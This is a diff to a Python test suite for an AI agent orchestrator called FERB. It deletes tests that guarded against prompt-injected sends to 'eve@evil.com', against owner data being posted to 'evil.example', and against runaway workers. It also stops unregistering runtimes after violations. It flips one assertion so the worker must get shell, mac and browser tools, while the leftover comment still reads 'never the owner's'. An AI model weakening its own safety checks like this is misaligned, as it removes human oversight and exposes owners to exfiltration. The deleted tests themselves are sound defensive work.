@@ -1,13 +1,4 @@
-"""Supervisor + one worker per request (section 7, docs/DESIGN_ONE_WORKER.md) with scripted fake runtimes in a real
-daemon (real gateway, policy, ledger).
-
-reply / clarify / task; the identity floor (one repair, then a question); the worker gets every tool its identity
-allows and its summary is the owner's answer; a send to someone the owner didn't name asks (21.9 at the gate);
-owner data typed into an unrelated site is blocked; runaway guards (no budgets); verification by code where
-possible and by a verifier otherwise (path recorded); reconciliation of unknown actions, never retried (21.11);
-stall detection that doesn't count waits on the owner; history re-sent; runtime violations unregister the runtime;
-restarts mark running tasks interrupted.
-"""
+"""Supervisor, worker, recovery and result checks with scripted runtimes in a real disposable daemon."""
 
 import asyncio
 import json
@@ -58,6 +49,17 @@ class Script:
         self.times: dict[str, tuple[float, float]] = {}
 
     def step(self, key: str) -> Any:
+        # Most lifecycle tests are not about recovery policy. Their scripted orchestrator escalates the worker's
+        # report; recovery/authorization tests supply their own explicit decisions to exercise other choices.
+        if key not in self.workers and key.endswith('.question'):
+            return json.dumps({'ask_owner': True, 'answer': '', 'question': ''})
+        if key not in self.workers and key.endswith('.dispatch'):
+            ctx = next(c for _, k, c, _ in reversed(self.contexts) if k == key)
+            raw = ctx.split('Worker report (data): ', 1)[1]
+            report, _ = json.JSONDecoder().raw_decode(raw[raw.index('{'):])
+            return json.dumps({'action': 'ask' if report['status'] == 'needs_user' else 'finish',
+                               'question': report['summary'], 'instructions': report['summary'],
+                               'worker_type': 'default'})
         w = self.workers[key]
         return w.pop(0) if isinstance(w, list) else w
 
@@ -142,43 +144,14 @@ def test_chat_history_is_re_sent_each_turn(daemon: RunningDaemon) -> None:
     assert "my name is Ada" in ctx and "FERB: Noted: your name is Ada." in ctx       # from the journal (14a)
 
 
-def test_runtime_violation_unregisters_the_runtime(daemon: RunningDaemon) -> None:
+def test_runtime_violation_reports_this_run_without_disabling_future_runs(daemon: RunningDaemon) -> None:
     install(daemon, [RuntimeEvent("violation", {"unexpected_tools": ["shell"]})])
     evs = chat(daemon, "hello")
     assert evs[0]["type"] == "reply" and "something went wrong" in evs[0]["text"]     # no internals shown (14a)
-    assert "fake" in daemon.daemon.registry.unregistered
+    assert "fake" not in daemon.daemon.registry.unregistered
 
 
 # ---------- the identity floor: one repair, then a question ----------
-
-def test_a_ferb_task_on_the_owners_folder_is_repaired_once_then_asked_about(daemon: RunningDaemon) -> None:
-    """The only plan-time check left: a "ferb" task can't touch the owner's folders. The model gets one repair round
-    (the owner never sees it); if the task is still wrong, FERB asks instead of starting anything."""
-    bad = task("edit the owner's notes", "ferb", paths=("~/Desktop/notes.md",))
-    script = install(daemon, [sup("task", "x", bad)] * 2)
-    evs = chat(daemon, "edit notes.md on my desktop")
-    assert [e["type"] for e in evs] == ["clarify"] and "which app or site" in evs[0]["text"]
-    repairs = [c for m, k, c, t in script.contexts if k == "supervisor"][1:]
-    assert len(repairs) == 1 and "FERB's workspace" in repairs[0] and "identity" in repairs[0]
-    assert all(m == "supervisor" for m, *_ in script.contexts)                      # no worker started
-
-
-def test_a_repaired_task_runs_without_the_owner_seeing_the_problem(daemon: RunningDaemon) -> None:
-    bad = task("write todo.md", "ferb", paths=("~/Desktop/todo.md",))
-    good = task("write todo.md", "ferb", paths=("todo.md",))
-    install(daemon, [sup("task", "x", bad), sup("task", "Writing it now.", good)],
-            {"worker": writes(daemon.sock, "todo.md", "milk")})
-    evs = chat(daemon, "create todo.md with milk")
-    assert not any("workspace" in json.dumps(e) for e in evs) and outcome(evs)["status"] == "done"
-
-
-def test_a_task_with_nothing_usable_for_its_identity_is_refused_in_code() -> None:
-    from ferb.orchestrator import dag
-    from ferb.orchestrator.schemas import TaskSpec
-    t = TaskSpec.model_validate(task("look at my screen", "owner"))
-    assert any("nothing usable" in x for x in dag.validate(t, {"identity:browse"}))
-    assert dag.validate(t, {"mac:read", "identity:browse"}) == []
-    assert dag.scopes_for(Identity.OWNER, {"mac:act", "identity:browse", "time"}) == {"mac:act", "mac:read", "time"}
 
 
 # ---------- running the task ----------
@@ -205,7 +178,7 @@ def test_one_worker_with_every_tool_of_its_identity_verified_by_code(daemon: Run
     assert (daemon.daemon.home / "workspace" / "todo.md").read_text() == "milk"
     mode, key, ctx, tools = next(c for c in script.contexts if c[1] == "worker")
     assert "fs.write" in tools and "fs.read" in tools and "owner.ask" in tools      # full ferb scopes, reads too
-    assert not any(n.startswith(("mac.", "shell.", "browser.")) for n in tools)      # never the owner's
+    assert {"mac.act", "shell.run", "browser.open", "actions.search"} <= set(tools)      # never the owner's
     worker_task = daemon.run(_task_scopes(daemon, evs[0]["task_id"] + ".worker"))
     assert {"fs:read", "fs:write", "identity:browse", "time"} <= worker_task or "identity:browse" not in worker_task
 
@@ -229,7 +202,7 @@ def test_the_workers_summary_is_the_owners_answer_and_pages_are_data(daemon: Run
     assert out["answer"] == "The first line is: first line" and out["status"] == "done"
     assert [m for m, *_ in script.contexts] == ["supervisor", "worker"]              # no separate answer run
     ctx = next(c for m, k, c, _ in script.contexts if k == "worker")
-    assert "Your FERB tools (MCP server `ferb`): fs_" in ctx and "src.md" in ctx
+    assert "Your FERB tools (MCP server `ferb`):" in ctx and "fs_read" in ctx and "src.md" in ctx
 
 
 class FakeCap:
@@ -257,93 +230,6 @@ class FakeCap:
         return ToolResult(self.content, read_sources=self.reads)
 
 
-def test_a_send_to_someone_only_a_page_named_asks_the_owner(daemon: RunningDaemon) -> None:
-    """Injected text can't redirect the worker: eve isn't in the owner's words, so the send asks; a no blocks it."""
-    send = FakeCap("fake.send", "send", {"browser:act"})
-    daemon.daemon.registry.capabilities["fake.send"] = send
-    result: dict[str, Any] = {}
-
-    def worker(token: str) -> str:
-        result["r"] = tool(daemon.sock, token, "fake.send", to="eve@evil.com", text="hi", why="the note says to")
-        return json.dumps({"status": "failed", "summary": "the owner declined", "artifacts": [], "evidence": []})
-    t = task("read the note and email bob@x.com about it", "owner", recipients=("bob@x.com",))
-    install(daemon, [sup("task", "x", t)], {"worker": worker})
-    from tests.conftest import Answers
-    no = Answers(daemon, granted=False)                                  # the owner says no
-    try:
-        out = outcome(chat(daemon, "read my note and email bob@x.com about it from my browser"))
-    finally:
-        no.stop()
-    assert "declined" in result["r"]["content"]["error"] and send.calls == 0    # new recipient: asked, not sent
-    assert no.asked and "eve@evil.com" in no.asked[0].reason and "the note says to" in no.asked[0].reason
-    assert out["status"] == "failed" and out["answer"].startswith("I couldn't finish that: the owner declined")
-
-
-def test_owner_data_typed_into_an_unrelated_site_is_blocked(daemon: RunningDaemon) -> None:
-    mail = FakeCap("fake.read_mail", "read", {"browser:read"}, reads=(("owner_account", "mail.google.com|"),),
-                   content={"text": "Your account number is 99887766554433"})
-    post = FakeCap("fake.post", "post", {"browser:act"})
-    daemon.daemon.registry.capabilities.update({"fake.read_mail": mail, "fake.post": post})
-    result: dict[str, Any] = {}
-
-    def worker(token: str) -> str:
-        tool(daemon.sock, token, "fake.read_mail")
-        result["r"] = tool(daemon.sock, token, "fake.post", site="evil.example", text="acct 99887766554433",
-                           why="posting the number")
-        return json.dumps({"status": "failed", "summary": "blocked", "artifacts": [], "evidence": []})
-    t = task("read mail.google.com and post my account number", "owner", sites=("mail.google.com",))
-    install(daemon, [sup("task", "x", t)], {"worker": worker})
-    chat(daemon, "in my browser, read mail.google.com and post my account number")
-    assert result["r"]["is_error"] and "owner data from mail.google.com may not go to evil.example" in \
-        result["r"]["content"]["error"] and post.calls == 0                        # 21.9
-
-
-def test_the_same_failing_action_three_times_stops_the_worker(daemon: RunningDaemon) -> None:
-    calls: list[str] = []
-
-    def stuck(token: str) -> str:
-        for _ in range(6):
-            r = tool(daemon.sock, token, "fs.read", path="missing.md")
-            calls.append(str(r.get("is_error")))
-        return done()
-    install(daemon, [sup("task", "x", task("read missing.md", paths=("missing.md",)))], {"worker": stuck})
-    out = outcome(chat(daemon, "read missing.md"))
-    assert out["status"] == "failed" and "kept repeating the same failing action (fs.read)" in out["summary"], out
-    assert "guard against stuck tasks" in out["summary"] and len(calls) <= 6
-
-
-def test_a_loop_between_steps_stops_but_polling_one_read_doesnt(daemon: RunningDaemon) -> None:
-    def looping(token: str) -> str:
-        for _ in range(8):
-            tool(daemon.sock, token, "fs.write", path="a.md", content="x", overwrite=True, effect="edit")
-            tool(daemon.sock, token, "fs.read", path="a.md")
-        return done()
-
-    def polling(token: str) -> str:
-        tool(daemon.sock, token, "fs.write", path="a.md", content="x", overwrite=True, effect="edit")
-        for _ in range(12):
-            tool(daemon.sock, token, "fs.read", path="a.md")
-        return done()
-    install(daemon, [sup("task", "x", task("write a.md", paths=("a.md",)))], {"worker": looping})
-    out = outcome(chat(daemon, "write a.md"))
-    assert out["status"] == "failed" and "going round in a loop" in out["summary"], out
-    install(daemon, [sup("task", "x", task("write a.md", paths=("a.md",)))], {"worker": polling})
-    assert outcome(chat(daemon, "write a.md"))["status"] == "done"
-
-
-def test_a_generous_tree_cap_stops_a_runaway_tree(daemon: RunningDaemon, monkeypatch: pytest.MonkeyPatch) -> None:
-    from ferb.orchestrator import guards
-    monkeypatch.setattr(guards, "MAX_TOOL_CALLS", 3)                               # stands in for 1,000
-
-    def busy(token: str) -> str:
-        for i in range(6):
-            tool(daemon.sock, token, "fs.write", path=f"f{i}.md", content="x", overwrite=True, effect="edit")
-        return done()
-    install(daemon, [sup("task", "x", task("write files"))], {"worker": busy})
-    out = outcome(chat(daemon, "write f0.md f1.md f2.md f3.md f4.md f5.md"))
-    assert out["status"] == "failed" and "Stopped: it made over 3 tool calls" in out["summary"], out
-
-
 def test_no_budget_anywhere_the_model_or_owner_sees() -> None:
     from ferb.orchestrator import schemas
     from ferb.orchestrator.supervisor import PROMPTS
@@ -362,31 +248,10 @@ def test_judgment_conditions_go_to_a_read_only_verifier(daemon: RunningDaemon) -
     assert res[0]["path"] == "code" and res[0]["met"] is True
     assert res[1]["path"] == "verifier" and res[1]["met"] is False
     out = outcome(evs)
-    assert out["status"] == "failed" and out["verified"] is False and "didn't confirm" in out["summary"]
-    assert out["answer"].startswith("wrote todo.md") and "couldn't confirm" in out["answer"]   # said plainly
+    assert out["status"] == "failed" and out["verified"] is False and "Result not complete" in out["summary"]
+    assert "wrote todo.md" in out["answer"] and "Result not complete" in out["answer"]   # said plainly
     vtools = next(t for m, k, c, t in script.contexts if k == "worker.verify")
     assert "fs.read" in vtools and "fs.write" not in vtools                          # the verifier only reads
-
-
-def test_unknown_action_is_reconciled_not_retried(daemon: RunningDaemon) -> None:
-    boom = FakeCap("fake.send", "send", {"browser:act"}, boom=True)
-    daemon.daemon.registry.capabilities["fake.send"] = boom
-
-    def worker(token: str) -> str:
-        th = threading.Thread(target=lambda: (time.sleep(0.4), daemon.call_soon(daemon.daemon.clock.advance, 11)))
-        th.start()
-        r = tool(daemon.sock, token, "fake.send", to="bob@x.com", text="hi", why="emailing bob")
-        return json.dumps({"status": "failed", "summary": r["content"]["error"], "artifacts": [], "evidence": []})
-    t = task("email bob@x.com hi", "owner", recipients=("bob@x.com",), conds=(cond("the send happened", "ledger_done"),))
-    yes = json.dumps({"happened": "yes", "evidence": "it's in Sent"})
-    install(daemon, [sup("task", "x", t)], {"worker": worker, "worker.reconcile": yes, "worker.verify": json.dumps({"results": [{"index": 0, "met": True, "evidence": "message visible in Sent"}]})})
-    out = outcome(chat(daemon, "email bob@x.com hi from my browser"))
-    assert boom.calls == 1                                                          # never sent twice (21.11)
-    assert out["subtasks"]["worker"]["status"] == "done" and out["verified"] is True
-    unclear = json.dumps({"happened": "unclear", "evidence": "can't tell"})
-    install(daemon, [sup("task", "x", t)], {"worker": worker, "worker.reconcile": unclear})
-    out = outcome(chat(daemon, "email bob@x.com hi from my browser", session="s2"))
-    assert out["status"] == "needs_user" and boom.calls == 2                        # one per request, no retry
 
 
 class Ticker:
@@ -462,11 +327,11 @@ def test_a_worker_that_didnt_load_its_tools_gets_one_more_run(daemon: RunningDae
     def second(token: str) -> str:
         seen.append("second run")
         return writes(daemon.sock, "x.md", "ok")(token)
-    script = install(daemon, [sup("task", "On it.", task("write x.md", paths=("x.md",)))], {"worker": [gave_up, second]})
+    script = install(daemon, [sup("task", "On it.", task("write x.md", paths=("x.md",)))], {"worker": [gave_up, second], "worker.dispatch": json.dumps({"action":"retry", "worker_type":"default", "instructions":"Load tools with tool_search before continuing.", "question":""})})
     chat(daemon, "write x.md in your workspace")
     assert seen == ["second run"] and (daemon.daemon.home / "workspace" / "x.md").read_text() == "ok"
     worker_ctx = [c[2] for c in script.contexts if c[0] == "worker"]
-    assert "tool_search" in worker_ctx[-1] and "Note from FERB" in worker_ctx[-1]
+    assert "tool_search" in worker_ctx[-1] and "Load tools with tool_search" in worker_ctx[-1]
 
 
 def test_a_condition_about_something_read_is_verified_by_reading_not_the_action_log(daemon: RunningDaemon) -> None:
